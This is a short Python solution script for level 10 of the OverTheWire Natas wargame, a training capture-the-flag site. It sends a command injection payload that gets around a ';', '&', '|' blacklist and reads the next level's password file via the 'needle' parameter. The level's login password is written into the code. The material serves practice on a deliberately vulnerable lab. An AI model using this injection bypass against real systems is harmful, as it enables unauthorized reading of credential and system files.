#!/usr/bin/env python 

'''
Vulnerability : Command Injection
But characters ';' ,'&' .'|' are blacklisted 
Bypass payload ". /etc/natas_webpass/natas11 #"  
'''

import requests 
import re 

r = requests.session()
url = "http://natas10.natas.labs.overthewire.org/?needle="
username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
payload = ".+%2Fetc%2Fnatas_webpass%2Fnatas11+%23&submit=Search"
resp = r.get(url+payload,auth = (username,password))
flag = re.findall(r'\w{32}',resp.text)
flag = flag[1]
print("The key is : "+ flag)

